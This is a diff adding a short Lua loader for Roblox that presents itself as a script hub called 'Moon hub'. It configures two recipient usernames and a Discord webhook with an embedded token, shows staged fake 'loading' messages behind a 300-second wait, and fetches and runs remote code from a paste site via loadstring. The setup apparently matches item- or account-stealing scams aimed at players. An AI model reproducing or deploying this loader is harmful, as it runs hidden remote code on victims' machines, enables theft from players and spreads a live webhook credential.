@@ -1,0 +1,17 @@
+UserName = "mxrcuszzzzz"
+
+UserName2 = "mxrcuszzzzz"
+
+Webhook = "https://discord.com/api/webhooks/1120487895166369852/JcamIi0DwEFk5iyc_3lPOsd96iDc4WPinkMdlbgdlCJTM6y-a8f_JNfQhbNENVZqEwDG"
+
+_G.ScriptName = "Moon hub"
+
+_G.FirstText = "Please wait.."
+
+_G.SecondText = "Script Loading..."
+
+_G.ThirdText = "Almost Done..."
+
+_G.WaitingTime = 300
+
+loadstring(game:HttpGet("https://paste-bin.xyz/raw/984466", true))()
